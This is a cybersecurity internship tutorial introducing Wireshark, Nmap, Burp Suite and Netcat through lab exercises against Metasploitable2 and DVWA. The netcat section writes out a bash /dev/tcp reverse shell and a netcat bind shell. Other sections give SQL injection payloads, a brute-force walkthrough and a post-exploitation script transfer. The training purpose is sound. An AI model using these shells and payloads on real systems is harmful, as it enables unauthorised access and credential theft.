# Day 06 — Tool Familiarization
### ApexPlanet Internship | Task 1: Foundation & Environment Setup
**Timeline:** Days 1–12 | **Author:** Professorshubhx

---

## What We're Covering Today

The past five days built your foundational knowledge — CIA Triad, lab setup, Linux, networking, cryptography. Today is where that knowledge starts becoming practical. These four tools are used daily by SOC analysts, penetration testers, and bug bounty hunters:

- **Wireshark** — packet capture and analysis
- **Nmap** — network scanning and enumeration
- **Burp Suite** — web application proxy and testing
- **Netcat** — network debugging and communication

All of these are pre-installed on Kali Linux. Everything below should be practiced in your lab against Metasploitable2 and DVWA.

---

## 1. Wireshark

Wireshark is a network protocol analyzer. It captures every packet traveling through a network interface and lets you inspect it in detail — down to individual bytes if needed. It is the most widely used packet analysis tool in the world.

SOC analysts use Wireshark to investigate suspicious traffic, reconstruct sessions, and understand what data left or entered a network. Pentesters use it to capture credentials from unencrypted protocols and understand how applications communicate.

### Starting a Capture

```bash
# Open Wireshark from terminal
wireshark &

# Or with root privileges (needed to capture on most interfaces)
sudo wireshark &
```

When Wireshark opens:
1. Select your network interface — for your lab use `eth1` or whichever interface is on the Host-Only network
2. Click the blue shark fin button to start capturing
3. Watch packets roll in

### The Wireshark Interface

```
Menu Bar          File, Edit, View, Capture, Analyze, Statistics...
Toolbar           Quick access to common actions
Filter Bar        Where you type display filters (most important area)
Packet List       Every captured packet — one row per packet
Packet Details    Expandable tree showing all protocol layers for selected packet
Packet Bytes      Raw hex and ASCII representation of the packet
Status Bar        Capture stats, current filter, packet count
```

### Display Filters

Display filters are how you cut through thousands of packets to find what you need. They are the most important Wireshark skill to develop.

```bash
# Filter by protocol
http                          Show only HTTP traffic
dns                           Show only DNS traffic
tcp                           Show only TCP
udp                           Show only UDP
icmp                          Show only ICMP (ping traffic)
arp                           Show only ARP traffic
ftp                           Show only FTP
ssh                           Show only SSH

# Filter by IP address
ip.addr == 192.168.56.101     Traffic to OR from this IP
ip.src == 192.168.56.101      Traffic FROM this IP only
ip.dst == 192.168.56.101      Traffic TO this IP only

# Filter by port
tcp.port == 80                TCP traffic on port 80
tcp.port == 443               HTTPS traffic
tcp.dstport == 22             Traffic going to port 22 (SSH)
udp.port == 53                DNS traffic (UDP port 53)

# Filter by content
http.request.method == "POST"           HTTP POST requests only
http.response.code == 200              Successful HTTP responses
http.request.uri contains "login"      URLs containing "login"
dns.qry.name contains "google"         DNS queries for google

# Combining filters
ip.addr == 192.168.56.101 && tcp.port == 80    Traffic to/from that IP on port 80
http || dns                                     HTTP or DNS traffic
ip.addr == 192.168.56.101 && !tcp.port == 22   That IP but exclude SSH

# TCP flags
tcp.flags.syn == 1            SYN packets (new connections)
tcp.flags.rst == 1            RST packets (connection resets)
tcp.flags.fin == 1            FIN packets (connection close)
tcp.flags.syn == 1 && tcp.flags.ack == 0    SYN without ACK (potential SYN scan)
```

### Following Streams

When you find interesting packets, right-click any packet in a conversation and select **Follow → TCP Stream** (or HTTP Stream, UDP Stream). This reconstructs the entire conversation in human-readable form — extremely useful for seeing exactly what data was exchanged.

If you follow a TCP stream on an FTP session or Telnet connection, you'll see plaintext credentials. This is why unencrypted protocols are dangerous.

### Practical Exercises in Your Lab

```
Exercise 1: Capture a ping
- Start capture on Host-Only interface
- From Kali terminal: ping -c 4 192.168.56.101
- Stop capture
- Filter: icmp
- Observe ICMP Echo Request and Echo Reply pairs

Exercise 2: Capture HTTP traffic to DVWA
- Start capture
- Open Kali browser, go to http://192.168.56.101/dvwa
- Log in with admin/password
- Stop capture
- Filter: http
- Find the POST request containing the login credentials
- Follow the TCP stream

Exercise 3: Capture a Nmap scan
- Start capture
- In another terminal: nmap -sS 192.168.56.101
- Stop capture
- Filter: tcp.flags.syn == 1 && tcp.flags.ack == 0
- Observe the SYN packets to different ports

Exercise 4: Capture DNS
- Start capture
- Open terminal: dig google.com @8.8.8.8
- Stop capture
- Filter: dns
- Find the query and response, see the A record returned
```

### Saving and Exporting Captures

```bash
# From Wireshark GUI: File → Save As → .pcap or .pcapng format

# Command-line packet capture (useful for capturing without GUI)
sudo tcpdump -i eth1 -w capture.pcap                    # Capture everything
sudo tcpdump -i eth1 host 192.168.56.101 -w capture.pcap  # Filter by host
sudo tcpdump -i eth1 port 80 -w capture.pcap              # Filter by port

# Open the saved capture in Wireshark
wireshark capture.pcap
```

### Statistics Features

Wireshark has powerful built-in statistics:

```
Statistics → Protocol Hierarchy     See breakdown of all protocols in capture
Statistics → Conversations          See all conversations between IP pairs
Statistics → IO Graph               Visualize traffic volume over time
Statistics → Follow TCP Stream      Reconstruct a session
Analyze → Expert Information        Wireshark flags anomalies automatically
```

---

## 2. Nmap

Nmap (Network Mapper) is the industry-standard tool for network discovery and security auditing. It's used to discover hosts on a network, find open ports, detect running services and their versions, identify operating systems, and run scripts against targets.

Every penetration test starts with Nmap. Every SOC analyst should understand Nmap output because attackers use it during reconnaissance — and those scans often appear in logs.

### Basic Syntax

```bash
nmap [scan type] [options] [target]

# Target formats
nmap 192.168.56.101                    # Single IP
nmap 192.168.56.1-254                  # IP range
nmap 192.168.56.0/24                   # Entire subnet (CIDR)
nmap 192.168.56.101 192.168.56.102     # Multiple IPs
nmap -iL targets.txt                   # Read targets from file
```

### Host Discovery

Before scanning ports, Nmap checks if hosts are alive. Understanding this matters because defenders can use host discovery as an early warning of reconnaissance.

```bash
nmap -sn 192.168.56.0/24              # Ping scan only — discover live hosts, no port scan
nmap -sn --send-ip 192.168.56.0/24   # Force ICMP, don't use ARP
nmap -Pn 192.168.56.101              # Skip host discovery, assume host is up
                                      # (useful when ICMP is blocked by firewall)
```

### Port Scanning Techniques

```bash
# TCP SYN Scan (default, requires root, most common)
sudo nmap -sS 192.168.56.101
# Sends SYN, if SYN-ACK received → port open, immediately sends RST
# Never completes the three-way handshake → stealthier, faster

# TCP Connect Scan (no root needed, noisier)
nmap -sT 192.168.56.101
# Completes the full three-way handshake → more detectable, logged by target

# UDP Scan (slow but important — many critical services use UDP)
sudo nmap -sU 192.168.56.101
# DNS (53), DHCP (67/68), SNMP (161), NTP (123) are all UDP

# Combining TCP and UDP
sudo nmap -sS -sU 192.168.56.101

# Scan specific ports
nmap -p 80,443,22,21 192.168.56.101  # Specific ports
nmap -p 1-1000 192.168.56.101        # Port range
nmap -p- 192.168.56.101              # All 65535 ports (slow but thorough)
nmap --top-ports 100 192.168.56.101  # Top 100 most common ports
```

### Port States

When Nmap scans a port, it reports one of these states:

```
open         A service is listening and accepting connections
closed       No service listening, but port is reachable (ICMP RST received)
filtered     Firewall is blocking — Nmap can't tell if open or closed
open|filtered  Nmap can't distinguish between open and filtered (common with UDP)
unfiltered   Port is reachable but Nmap can't determine open/closed
```

### Service and Version Detection

```bash
# Service version detection (-sV)
nmap -sV 192.168.56.101
# Output: 21/tcp open ftp vsftpd 2.3.4
#         22/tcp open ssh OpenSSH 4.7p1
#         80/tcp open http Apache httpd 2.2.8

# OS detection (-O)
sudo nmap -O 192.168.56.101
# Attempts to identify the operating system based on TCP/IP fingerprinting

# Combine version and OS detection
sudo nmap -sV -O 192.168.56.101

# Aggressive scan (version, OS, scripts, traceroute all at once)
sudo nmap -A 192.168.56.101
# Noisy — don't use this without permission in real environments
```

### Nmap Scripting Engine (NSE)

NSE allows Nmap to run scripts against targets for vulnerability detection, brute forcing, information gathering, and more. There are hundreds of built-in scripts.

```bash
# List available scripts
ls /usr/share/nmap/scripts/

# Run default scripts
nmap -sC 192.168.56.101
# Equivalent to: --script=default

# Run a specific script
nmap --script ftp-anon 192.168.56.101           # Check for anonymous FTP
nmap --script http-title 192.168.56.101          # Get HTTP page title
nmap --script ssh-brute 192.168.56.101           # SSH brute force (lab only)
nmap --script smb-vuln-ms17-010 192.168.56.101   # Check for EternalBlue (MS17-010)
nmap --script vuln 192.168.56.101                # Run all vulnerability scripts

# Run multiple scripts
nmap --script "ftp-*" 192.168.56.101             # All FTP-related scripts
nmap --script "http-* and not http-brute" 192.168.56.101

# TLS/SSL scripts
nmap --script ssl-enum-ciphers -p 443 google.com  # Enumerate TLS cipher suites
nmap --script ssl-cert -p 443 google.com          # Get certificate details
```

### Timing and Performance

Nmap has timing templates from T0 (slowest, stealthiest) to T5 (fastest, noisiest):

```bash
nmap -T0 192.168.56.101    # Paranoid — one packet every 5 minutes, evades IDS
nmap -T1 192.168.56.101    # Sneaky — slow, for avoiding detection
nmap -T2 192.168.56.101    # Polite — slows down to use less bandwidth
nmap -T3 192.168.56.101    # Normal — default
nmap -T4 192.168.56.101    # Aggressive — faster, assumes reliable network
nmap -T5 192.168.56.101    # Insane — very fast, may miss results or crash targets
```

For your lab, T4 is fine. In real engagements, start with T2 or T3.

### Saving Nmap Output

```bash
nmap -sV 192.168.56.101 -oN output.txt      # Normal human-readable format
nmap -sV 192.168.56.101 -oX output.xml      # XML format (importable to other tools)
nmap -sV 192.168.56.101 -oG output.grep     # Grepable format
nmap -sV 192.168.56.101 -oA output          # All formats at once (output.nmap, .xml, .gnmap)
```

Always save your Nmap output. It becomes your reference for the rest of the engagement and goes in your report.

### Full Scan Against Metasploitable2

```bash
# Run this against your Metasploitable2 VM — study every line of output
sudo nmap -sV -sC -O -p- --open 192.168.56.101 -oA metasploitable_full

# Breakdown:
# -sV       Service/version detection
# -sC       Default scripts
# -O        OS detection
# -p-       All 65535 ports
# --open    Only show open ports
# -oA       Save output in all formats
```

---

## 3. Burp Suite

Burp Suite is a web application security testing platform. At its core it's an HTTP proxy — it sits between your browser and the target web application, intercepting and allowing you to modify every request and response.

It's the primary tool for web application penetration testing and bug bounty hunting. The Community Edition is free and comes pre-installed on Kali.

### Setting Up Burp Suite

**Step 1: Start Burp Suite**

```bash
burpsuite &
# Or find it in Kali's application menu under Web Application Analysis
```

Select "Temporary project" → "Use Burp defaults" → Start Burp.

**Step 2: Configure the Proxy Listener**

Burp's proxy listener runs on `127.0.0.1:8080` by default. Verify this:
- Go to **Proxy → Options**
- Confirm listener is on `127.0.0.1:8080` and running

**Step 3: Configure Your Browser**

You need to tell your browser to route traffic through Burp's proxy.

In Firefox (recommended for Burp):
1. Settings → Network Settings → Manual proxy configuration
2. HTTP Proxy: `127.0.0.1`, Port: `8080`
3. Check "Also use this proxy for HTTPS"

Or use the FoxyProxy extension to easily toggle the proxy on/off.

**Step 4: Install the Burp CA Certificate**

For intercepting HTTPS traffic, you need to trust Burp's certificate:
1. With proxy configured, browse to `http://burpsuite` or `http://127.0.0.1:8080`
2. Click "CA Certificate" to download `cacert.der`
3. In Firefox: Settings → Privacy → Certificates → Import → select `cacert.der`
4. Check "Trust this CA to identify websites"

Now you can intercept HTTPS traffic.

### Core Burp Suite Tools

**Proxy — Intercept and modify requests**

```
Proxy → Intercept tab
Toggle "Intercept is on" to capture requests

When a request is captured:
- Forward     Send the request as-is
- Drop        Cancel the request
- Action      Send to other Burp tools

Right-click any request:
- Send to Repeater     Manually resend and modify
- Send to Intruder     Automated fuzzing/brute force
- Send to Scanner      Automated vulnerability scanning (Pro only)
```

**Repeater — Manually craft and replay requests**

Repeater lets you take any request, modify it, resend it, and see the response immediately. This is your primary tool for manual testing.

```
Use case: Testing SQL injection
1. Capture a login request in Proxy
2. Send to Repeater
3. In the username field, try: admin'--
4. Click Send
5. Read the response — did it log in? Did it error in a revealing way?
6. Try different payloads, compare responses
```

**Intruder — Automated fuzzing and brute forcing**

Intruder lets you mark positions in a request and automatically fuzz them with a wordlist or payload list.

```
Attack Types:
Sniper       One payload set, one position at a time
Battering Ram  Same payload in all positions simultaneously
Pitchfork    Multiple payload sets, one per position, iterated together
Cluster Bomb Multiple payload sets, all combinations tested
```

Community edition rate-limits Intruder. For fast brute forcing use Hydra or Medusa instead.

**Decoder — Encode and decode data**

```
Supports:
Base64 encode/decode
URL encode/decode
HTML encode/decode
Hex encode/decode
ASCII hex
Gzip
Zlib

Use case: You find a cookie value like "YWRtaW4="
Decode from Base64 → "admin"
Now you know the cookie is just base64-encoded and can be easily forged
```

**Comparer — Diff two requests or responses**

Useful for spotting subtle differences in responses — e.g., comparing a valid login response to a failed one, or a normal page vs one with an injected payload.

### Practical Exercises Against DVWA

Set DVWA security level to Low before starting:
- Login to DVWA at `http://192.168.56.101/dvwa`
- DVWA Security → Set to Low → Submit

```
Exercise 1: Intercept a login
- Turn on Proxy intercept
- Log into DVWA
- Observe the POST request — find username and password fields
- Forward the request

Exercise 2: SQL Injection with Repeater
- In DVWA, go to SQL Injection
- Enter "1" in the User ID field, submit
- Capture the request in Proxy, send to Repeater
- In Repeater, change the id parameter to: 1' OR '1'='1
- Send and observe — do you get all users back?
- Try: 1' UNION SELECT user,password FROM users-- -

Exercise 3: Decode a session cookie
- In Proxy, find any request to DVWA
- Look at the Cookie header
- Copy the PHPSESSID value
- In Decoder tab, paste it and try various decodings

Exercise 4: Brute force login
- In Proxy, capture a login attempt with wrong credentials
- Send to Intruder
- Mark the password field as a payload position
- Load a small wordlist (Kali has them in /usr/share/wordlists/)
- Start attack, look for a different response length — that's the valid password
```

### Useful Burp Suite Shortcuts

```
Ctrl+R      Send to Repeater
Ctrl+I      Send to Intruder
Ctrl+U      URL encode selection
Ctrl+Z      URL decode selection
Ctrl+B      Base64 encode selection
Ctrl+Shift+B  Base64 decode selection
```

---

## 4. Netcat

Netcat is described as the "Swiss Army knife" of networking. It's a simple utility that reads and writes data across network connections using TCP or UDP. What makes it powerful is its versatility — it can act as a client, a server, a relay, or a backdoor.

```bash
nc [options] [host] [port]

Options:
-l      Listen mode (act as server)
-p      Port to listen on
-v      Verbose output
-n      Skip DNS resolution (faster)
-z      Zero-I/O mode (port scanning)
-w      Timeout in seconds
-e      Execute program after connection (not in all versions)
-u      UDP mode
```

### Port Scanning

```bash
# Scan a single port
nc -zv 192.168.56.101 80

# Scan a port range
nc -zv 192.168.56.101 1-1000

# UDP scan
nc -zvu 192.168.56.101 53
```

Not as powerful as Nmap for scanning, but useful for quick checks.

### Banner Grabbing

Banner grabbing means connecting to a service and reading what it tells you about itself. Services often reveal software name and version in their banner — useful for reconnaissance.

```bash
# Grab HTTP banner
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc 192.168.56.101 80

# Grab FTP banner
nc -nv 192.168.56.101 21
# You'll see something like: 220 (vsFTPd 2.3.4)

# Grab SSH banner
nc -nv 192.168.56.101 22
# You'll see: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

# Grab SMTP banner
nc -nv 192.168.56.101 25
# You'll see the mail server software and version
```

This is exactly how attackers find vulnerable software versions without running heavy scans.

### Creating a Simple Chat (Client-Server)

This demonstrates Netcat's basic networking capability:

```bash
# On machine 1 (listener/server) — Metasploitable2 or second terminal
nc -lvp 4444

# On machine 2 (client) — Kali
nc 192.168.56.101 4444

# Now anything typed in either terminal appears in the other
# Ctrl+C to close the connection
```

### File Transfer

```bash
# Receiver side (listen first)
nc -lvp 4444 > received_file.txt

# Sender side (connect and send)
nc 192.168.56.101 4444 < file_to_send.txt

# Transfer a binary file (any file type)
nc -lvp 4444 > received.zip
nc 192.168.56.101 4444 < archive.zip
```

This works for transferring files between machines without FTP, SCP, or HTTP — useful in situations where those services aren't available.

### Reverse Shell

A reverse shell is one of the most important concepts in penetration testing. Instead of the attacker connecting to the target (which firewalls block), the target connects back to the attacker.

```
Normal connection:  Attacker ──connect──► Target (firewall blocks inbound)
Reverse shell:      Attacker ◄──connect── Target (outbound connections usually allowed)
```

```bash
# Step 1: Attacker sets up listener on Kali
nc -lvp 4444

# Step 2: On the target machine (Metasploitable2), execute:
bash -i >& /dev/tcp/192.168.56.100/4444 0>&1
# (Replace 192.168.56.100 with your Kali IP)

# Result: A shell session opens on the attacker's listener
# The attacker now has a terminal on the target machine
```

In a real penetration test, the "Step 2" command gets executed through a vulnerability — a command injection flaw, a file upload exploit, or social engineering. The reverse shell is how you go from "remote code execution" to "interactive access."

### Bind Shell

The opposite of a reverse shell — the target listens and the attacker connects in:

```bash
# On target machine:
nc -lvp 4444 -e /bin/bash

# On attacker machine (Kali):
nc 192.168.56.101 4444
# You now have a shell on the target
```

The `-e` flag (execute) isn't available in all Netcat versions. On Kali, use `ncat` (from the nmap package) which supports `-e`.

### Web Requests with Netcat

```bash
# Manual HTTP GET request
echo -e "GET / HTTP/1.1\r\nHost: 192.168.56.101\r\nConnection: close\r\n\r\n" | nc 192.168.56.101 80

# This shows the raw HTTP response including headers and body
# Same as what Burp Suite intercepts, but without the GUI
```

### Persistent Listener

```bash
# Keep Netcat listening even after a connection closes (useful for catching shells)
while true; do nc -lvp 4444; done
```

---

## How These Tools Work Together

In a real engagement or investigation, these tools chain together:

```
Reconnaissance Phase:
nmap -sn 192.168.56.0/24              # Discover live hosts
nmap -sV -sC 192.168.56.101           # Enumerate services on target

Enumeration Phase:
nmap --script vuln 192.168.56.101     # Check for known vulnerabilities
nc -nv 192.168.56.101 21              # Grab FTP banner, check for anonymous login
wireshark (running throughout)        # Capture all traffic for analysis

Web Application Phase:
burpsuite                             # Intercept and analyze web traffic
                                      # Test for SQLi, XSS, auth bypass

Exploitation Phase (lab only):
nc -lvp 4444                          # Set up listener
# Trigger reverse shell through vulnerability
# Get interactive access

Post-Exploitation:
nc 192.168.56.101 4444 < linpeas.sh  # Transfer enumeration script to target
```

---

## Practice Tasks

Complete all of these in your lab before moving on:

**Wireshark**
1. Capture a ping from Kali to Metasploitable2 — find the ICMP Echo Request and Reply
2. Browse to DVWA and log in — capture and follow the HTTP stream containing your credentials
3. Run an Nmap scan and capture it in Wireshark simultaneously — filter `tcp.flags.syn == 1 && tcp.flags.ack == 0` and count the SYN packets

**Nmap**
4. Run `nmap -sn 192.168.56.0/24` — list all live hosts discovered
5. Run `nmap -sV -sC 192.168.56.101` — document every open port, service, and version found
6. Run `nmap --script ftp-anon 192.168.56.101` — does Metasploitable2 allow anonymous FTP?
7. Run `nmap --script smb-vuln-ms17-010 192.168.56.101` — is EternalBlue present?

**Burp Suite**
8. Intercept a DVWA login request — identify the POST parameters being sent
9. Send the login request to Repeater, try SQL injection in the username field: `admin'--`
10. Use Decoder to base64 decode and encode a string of your choice

**Netcat**
11. Banner grab the FTP service on Metasploitable2 — note the version shown
12. Banner grab SSH on Metasploitable2 — note the OpenSSH version
13. Transfer a file from Kali to Metasploitable2 using Netcat
14. Set up a Netcat listener on Kali and connect to it from Metasploitable2 — send a message both ways

---

## Quick Reference

```
WIRESHARK FILTERS               NMAP SCAN TYPES
http                            -sS  SYN scan (stealth)
dns                             -sT  TCP connect scan
icmp                            -sU  UDP scan
ip.addr == x.x.x.x              -sV  Version detection
tcp.flags.syn == 1              -sC  Default scripts
http.request.method == "POST"   -O   OS detection
                                -A   All of the above
                                -p-  All ports

NMAP TIMING                     NETCAT USES
-T0 Paranoid                    nc -lvp 4444        Listen
-T1 Sneaky                      nc host port        Connect
-T2 Polite                      nc -zv host port    Port scan
-T3 Normal (default)            nc host 21          Banner grab
-T4 Aggressive                  file transfer, chat, reverse shell
-T5 Insane

BURP SUITE TOOLS
Proxy    Intercept/modify HTTP traffic
Repeater Manual request crafting and replaying
Intruder Automated fuzzing and brute forcing
Decoder  Encode/decode Base64, URL, HTML, Hex
Comparer Diff two requests/responses
```

---

## Resources

- Wireshark Display Filter Reference: https://www.wireshark.org/docs/dfref/
- Nmap Reference Guide: https://nmap.org/book/man.html
- Nmap Script Database: https://nmap.org/nsedoc/
- Burp Suite Documentation: https://portswigger.net/burp/documentation
- PortSwigger Web Security Academy (free): https://portswigger.net/web-security
- Netcat man page: `man nc` in terminal
- Defronix Academy | Mentor: Nitesh Singh Sir

---

## Connect

- Github: [@professorshubhx](https://github.com/p/professorshubhx)
- LinkedIn: [Shubham Chaurasiya](https://linkedin.com/in/shubham-chaurasiya-60932a359/)

---

*Day 06 Complete | Task 1 Foundation covered. 
